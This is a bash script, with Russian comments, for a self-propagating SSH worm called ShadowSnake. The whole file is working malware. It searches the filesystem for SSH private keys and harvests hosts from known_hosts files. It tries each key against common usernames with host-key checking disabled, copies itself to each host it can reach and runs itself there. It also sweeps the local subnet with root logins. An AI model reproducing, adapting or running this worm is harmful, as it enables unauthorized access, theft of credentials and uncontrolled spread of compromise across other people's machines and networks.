#!/bin/bash
# ShadowSnake — самораспространяющийся червь
# Находит SSH ключи → заражает соседей → повторяет

SNAKE_DIR="$HOME/.shadow_snake"
mkdir -p "$SNAKE_DIR"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — SHADOWSNAKE                ║"
echo "║   Самораспространяющийся червь              ║"
echo "╚══════════════════════════════════════════════╝"

# 1. Собираем все SSH ключи
echo "[SNAKE] Собираю SSH ключи..."
KEYS=$(find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | grep -v ".pub" | head -20)
echo "[SNAKE] Найдено ключей: $(echo "$KEYS" | wc -l)"

# 2. Ищем known_hosts и config
KNOWN_HOSTS=$(find ~/.ssh /root/.ssh /home -name "known_hosts" 2>/dev/null | head -5)
KNOWN=$(cat $KNOWN_HOSTS 2>/dev/null | grep -oP '[\d.]+|[\w.-]+' | sort -u | head -30)

# 3. Пробуем подключиться к каждому хосту
echo "[SNAKE] Заражаю соседей..."
INFECTED=0

for host in $KNOWN; do
    [ "$host" = "localhost" ] && continue
    [ "$host" = "127.0.0.1" ] && continue
    
    for key in $KEYS; do
        for user in root admin ubuntu centos debian kali; do
            # Проверяем подключение
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -i "$key" "$user@$host" "echo infected" 2>/dev/null | grep -q "infected" && {
                echo "  🔗 $user@$host (ключ: $(basename $key))"
                
                # Копируем себя на новый хост
                scp -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i "$key" "$0" "$user@$host:/tmp/.shadow_snake.sh" 2>/dev/null
                
                # Запускаем себя на новом хосте
                ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i "$key" "$user@$host" \
                    "bash /tmp/.shadow_snake.sh &" 2>/dev/null &
                
                INFECTED=$((INFECTED + 1))
                break 2
            }
        done
    done
done

# 4. Также сканируем локальную сеть
SUBNET=$(ip route 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1 | cut -d. -f1-3)
[ -n "$SUBNET" ] && {
    echo "[SNAKE] Сканирую локальную сеть $SUBNET.0/24..."
    for i in {1..254}; do
        ip="$SUBNET.$i"
        ping -c1 -W1 "$ip" >/dev/null 2>&1 || continue
        
        for key in $KEYS; do
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes -i "$key" "root@$ip" \
                "bash /tmp/.shadow_snake.sh &" 2>/dev/null &
        done
    done
}

echo "[SNAKE] Заражено: $INFECTED новых хостов"
echo "[SNAKE] Червь продолжит расползаться на новых хостах"
